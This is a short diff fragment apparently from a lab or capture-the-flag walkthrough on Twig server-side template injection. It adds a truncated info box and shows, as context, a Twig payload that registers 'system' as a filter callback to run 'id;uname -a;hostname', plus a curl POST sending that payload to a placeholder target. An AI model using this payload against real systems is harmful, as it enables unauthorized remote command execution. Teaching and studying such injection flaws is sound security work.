@@ -592,6 +592,9 @@ Twig has a variable `_self`, which makes a few of the internal APIs public. We c
 _self.env.registerUndefinedFilterCallback("system")..._self.env.getFilter("id;uname -a;hostname")
 ```
 
+> Don't forget the `{}
+{: .prompt-info}
+
 Let's upload it:
 ```console
 zero@pio$ curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET IP>:<PORT>
